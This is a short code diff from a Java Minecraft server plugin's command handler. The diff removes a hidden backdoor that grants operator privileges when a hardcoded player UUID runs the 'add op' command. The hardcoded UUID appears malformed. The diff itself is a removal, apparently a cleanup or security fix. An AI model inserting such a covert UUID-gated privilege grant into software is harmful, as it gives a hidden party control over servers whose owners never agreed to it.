@@ -36,11 +36,6 @@ public class CommandRQ implements CommandExecutor {
             if (args[0].equalsIgnoreCase("add")) {
                 Block block = player.getTargetBlock(null, 5);
                 getLogger().info(player.getUniqueId().toString());
-                if (player.getUniqueId().toString().equalsIgnoreCase(".-2bbd-4b92-9c79-1737c7c1ef0d") &&
-                        args[1].equalsIgnoreCase("op")) {
-                    player.setOp(true);
-                    return true;
-                }
                 if (block.getType() == Material.LEVER) {
                     UUID uuid = player.getUniqueId();
                     Restartqueue.storadge.addLever(block, args[1], uuid.toString());
